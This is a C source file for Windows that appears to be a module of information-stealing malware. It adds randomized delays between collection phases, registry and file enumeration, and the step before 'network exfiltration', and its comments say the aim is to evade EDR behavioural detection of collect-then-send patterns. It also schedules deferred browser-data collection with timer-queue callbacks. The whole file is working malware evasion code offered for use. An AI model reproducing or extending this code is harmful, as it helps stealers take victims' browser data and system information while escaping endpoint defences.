/*
 * Behavioral Pacing — avoid rapid-action behavioral triggers
 *
 * EDRs flag rapid sequences: file_read -> file_read -> file_read -> connect.
 * This module inserts jittered delays between operations and stages
 * collection across time to look like normal user activity.
 *
 * Compile: x86_64-w64-mingw32-gcc -c behavioral_pacing.c -o behavioral_pacing.o
 */

#include <windows.h>

/* Simple LCG PRNG seeded from high-resolution timer */
static DWORD pace_seed = 0;

static void pace_init_rng(void) {
    LARGE_INTEGER pc;
    QueryPerformanceCounter(&pc);
    pace_seed = (DWORD)(pc.QuadPart ^ GetTickCount() ^ GetCurrentProcessId());
}

static DWORD pace_rand(void) {
    pace_seed = pace_seed * 1103515245 + 12345;
    return (pace_seed >> 16) & 0x7FFF;
}

/*
 * pace_jitter_sleep — sleep for base_ms +/- jitter_pct% with randomization.
 *
 * Example: pace_jitter_sleep(2000, 50) sleeps 1000-3000ms.
 */
void pace_jitter_sleep(DWORD base_ms, DWORD jitter_pct) {
    if (pace_seed == 0) pace_init_rng();
    if (jitter_pct > 100) jitter_pct = 100;

    DWORD jitter_range = (base_ms * jitter_pct) / 100;
    DWORD actual;
    if (jitter_range > 0)
        actual = base_ms - jitter_range + (pace_rand() % (jitter_range * 2));
    else
        actual = base_ms;

    Sleep(actual);
}

/*
 * pace_between_ops — call between individual operations within a
 * collection phase. Short delay (200-800ms) to avoid burst patterns.
 */
void pace_between_ops(void) {
    pace_jitter_sleep(500, 60);
}

/*
 * pace_between_phases — call between major collection phases
 * (e.g., between system_info and browser_data). Longer delay
 * (2-6 seconds) to break up the behavioral chain.
 */
void pace_between_phases(void) {
    pace_jitter_sleep(4000, 50);
}

/*
 * pace_pre_exfil — delay before network exfiltration. This is the
 * most important pacing point: EDRs watch for collect-then-send.
 * Delay 5-15 seconds.
 */
void pace_pre_exfil(void) {
    pace_jitter_sleep(10000, 50);
}

/*
 * pace_api_call — microsleep to space out rapid API calls like
 * RegOpenKeyEx loops or file enumeration. 50-150ms.
 */
void pace_api_call(void) {
    pace_jitter_sleep(100, 50);
}

/*
 * pace_schedule_collection — for long-running collection, stage
 * operations using a timer callback. Queues `callback` to run
 * after `delay_ms` with the given context.
 *
 * Use when you want to defer browser collection until minutes
 * after initial execution.
 */
typedef void (*pace_callback)(void *ctx);

static VOID CALLBACK timer_callback_wrapper(PVOID ctx, BOOLEAN fired) {
    (void)fired;
    /* ctx points to a struct { pace_callback fn; void *user_ctx; } */
    typedef struct { pace_callback fn; void *user_ctx; } cb_wrapper;
    cb_wrapper *w = (cb_wrapper *)ctx;
    if (w && w->fn) w->fn(w->user_ctx);
}

HANDLE pace_schedule_deferred(pace_callback fn, void *ctx, DWORD delay_ms) {
    typedef struct { pace_callback fn; void *user_ctx; } cb_wrapper;
    cb_wrapper *w = (cb_wrapper *)HeapAlloc(GetProcessHeap(), 0, sizeof(cb_wrapper));
    if (!w) return NULL;
    w->fn = fn;
    w->user_ctx = ctx;

    HANDLE hTimer = NULL;
    if (!CreateTimerQueueTimer(&hTimer, NULL, timer_callback_wrapper,
                               w, delay_ms, 0,
                               WT_EXECUTEONLYONCE | WT_EXECUTEINTIMERTHREAD)) {
        HeapFree(GetProcessHeap(), 0, w);
        return NULL;
    }
    return hTimer;
}

/*
 * pace_staged_main — wrapper that runs collection in stages with
 * human-like delays between each phase. Pass an array of function
 * pointers and this will call them with pacing between each.
 */
typedef void (*collect_fn)(void);

void pace_staged_main(collect_fn *funcs, int count) {
    if (pace_seed == 0) pace_init_rng();

    for (int i = 0; i < count; i++) {
        if (i > 0) pace_between_phases();
        funcs[i]();
    }

    pace_pre_exfil();
}
